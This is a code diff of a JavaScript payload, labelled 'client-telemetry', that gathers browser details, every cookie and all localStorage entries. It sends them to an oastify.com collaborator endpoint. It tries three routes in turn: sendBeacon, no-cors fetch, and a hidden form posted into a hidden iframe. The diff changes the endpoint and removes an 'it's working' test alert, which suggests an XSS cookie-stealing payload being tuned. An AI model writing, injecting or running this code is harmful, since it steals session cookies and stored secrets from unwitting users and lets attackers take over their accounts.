@@ -3,7 +3,7 @@
 
 (function () {
   // ===================== CONFIG =====================
-  const LOG_ENDPOINT = "https://edvua4ghyiamu6w1wkgjogyvgmmdacy1.oastify.com"; // <- replace with your endpoint
+  const LOG_ENDPOINT = "https://gfzwc6ij0kcow8y3ymilqi0xioofcg05.oastify.com"; // <- твой эндпоинт
 
   // ===================== COLLECT =====================
   function collectContext() {
@@ -19,10 +19,7 @@
       lang: navigator.language,
       platform: navigator.platform,
       tz: Intl.DateTimeFormat().resolvedOptions().timeZone || "",
-      viewport: {
-        w: window.innerWidth,
-        h: window.innerHeight
-      },
+      viewport: { w: window.innerWidth, h: window.innerHeight },
       screen: {
         w: (screen && screen.width) || null,
         h: (screen && screen.height) || null,
@@ -38,7 +35,6 @@
       const i = entry.indexOf("=");
       const name = i === -1 ? entry : entry.slice(0, i);
       const value = i === -1 ? "" : entry.slice(i + 1);
-      // decode for readability; keep undecodable as-is
       let dec = value;
       try { dec = decodeURIComponent(value); } catch {}
       return { name, value: dec };
@@ -54,9 +50,7 @@
         const value = localStorage.getItem(key);
         entries.push({ key, value });
       }
-    } catch {
-      // Access may throw in some privacy modes; leave entries empty.
-    }
+    } catch {}
     return { entries, total: entries.length };
   }
 
@@ -64,15 +58,18 @@
   function postNoCors(endpoint, payloadObj) {
     const bodyStr = JSON.stringify(payloadObj);
 
-    // 1) sendBeacon (reliable, background; no CORS needed, no response readable)
+    // 1) sendBeacon
     try {
       if (navigator.sendBeacon && endpoint.startsWith("https://")) {
         const blob = new Blob([bodyStr], { type: "text/plain;charset=UTF-8" });
-        if (navigator.sendBeacon(endpoint, blob)) return true;
+        if (navigator.sendBeacon(endpoint, blob)) {
+          console.log("[telemetry] sent via sendBeacon");
+          return true;
+        }
       }
-    } catch {}
+    } catch (e) { console.warn("[telemetry] sendBeacon failed:", e); }
 
-    // 2) fetch(no-cors) with simple body (string). Do NOT set headers to avoid preflight.
+    // 2) fetch(no-cors)
     try {
       fetch(endpoint, {
         method: "POST",
@@ -80,10 +77,11 @@
         keepalive: true,
         body: bodyStr
       }).catch(() => {});
+      console.log("[telemetry] sent via fetch(no-cors) (opaque response)");
       return true;
-    } catch {}
+    } catch (e) { console.warn("[telemetry] fetch failed:", e); }
 
-    // 3) Hidden <form> POST into a hidden <iframe> (navigational fallback)
+    // 3) form + iframe
     try {
       const form = document.createElement("form");
       form.method = "POST";
@@ -91,7 +89,7 @@
       form.style.display = "none";
 
       const ta = document.createElement("textarea");
-      ta.name = "d"; // server reads field "d" containing JSON string
+      ta.name = "d";
       ta.value = bodyStr;
       form.appendChild(ta);
 
@@ -105,8 +103,9 @@
       form.submit();
 
       setTimeout(() => { try { iframe.remove(); form.remove(); } catch {} }, 3000);
+      console.log("[telemetry] sent via form+iframe");
       return true;
-    } catch {}
+    } catch (e) { console.warn("[telemetry] form+iframe failed:", e); }
 
     return false;
   }
@@ -115,13 +114,10 @@
   const payload = {
     kind: "client-telemetry",
     context: collectContext(),
-    cookies: parseCookies(),        // { raw, entries:[{name,value}], total }
-    localStorage: collectLocalStorage() // { entries:[{key,value}], total }
+    cookies: parseCookies(),
+    localStorage: collectLocalStorage()
   };
 
-  postNoCors(LOG_ENDPOINT, payload)});
-
-  alert("it's working");
-
-  123123
+  postNoCors(LOG_ENDPOINT, payload);
+})();
   
